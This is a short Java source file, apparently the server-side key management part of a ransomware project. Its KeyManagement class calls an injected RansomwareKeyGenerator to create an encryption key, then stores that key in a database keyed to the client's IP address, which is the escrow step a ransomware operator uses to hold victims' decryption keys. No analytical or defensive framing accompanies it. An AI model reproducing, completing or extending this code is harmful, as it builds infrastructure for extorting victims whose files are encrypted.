package server.keys;

import java.security.NoSuchAlgorithmException;

import javax.inject.Inject;

import server.repositories.KeyRepository;
import server.entities.CryptoKey;
import server.exceptions.AlgorithmNotFoundException;

public class KeyManagement {
	@Inject
	private KeyRepository repository;
	@Inject
	private RansomwareKeyGenerator<?> clientKey;

	public <T> T createKey(String encalgo, String ip) throws AlgorithmNotFoundException, NoSuchAlgorithmException {
		
		T key = (T) clientKey.generateKey(encalgo);
		save(new CryptoKey<T>(ip, key, encalgo)); // Save to DB
		return (T) key;

	}

	public void save(CryptoKey entity) {
		repository.save(entity);

	}

}
